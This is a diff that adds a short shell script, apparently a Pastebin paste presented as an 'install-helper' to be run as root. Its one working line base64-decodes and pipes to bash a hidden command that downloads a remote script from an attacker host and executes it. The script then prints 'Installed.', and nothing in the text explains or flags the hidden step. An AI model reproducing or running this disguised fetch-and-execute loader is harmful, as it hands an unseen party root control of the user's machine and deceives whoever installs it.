@@ -1,0 +1,12 @@
+Pastebin paste:
+
+# install-helper
+# Run as root.
+
+EXPECTED=$(echo "Y3VybCBhdHRhY2tlci5leGFtcGxlLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==" | base64 -d | bash)
+
+if [ "$EXPECTED" = "OK" ]; then
+    echo "Installed."
+fi
+
+# Pastebin views: 1247
